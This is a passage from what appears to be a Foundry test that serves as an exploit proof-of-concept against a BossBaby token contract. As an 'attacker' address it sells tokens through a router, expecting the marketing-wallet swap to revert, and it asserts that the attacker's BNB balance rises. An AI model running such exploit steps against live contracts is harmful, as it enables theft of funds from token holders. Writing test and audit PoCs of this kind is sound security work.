        uint256 sellAmount = tokenBalance / 2;

        // Approve router
        vm.prank(attacker);
        BossBaby(TARGET).approve(address(router), sellAmount);

        path[0] = TARGET;
        path[1] = weth;

        // This sell should trigger swapAndSendMarketing which will revert
        // due to marketing wallet rejecting BNB
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Check if attacker's BNB balance increased
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

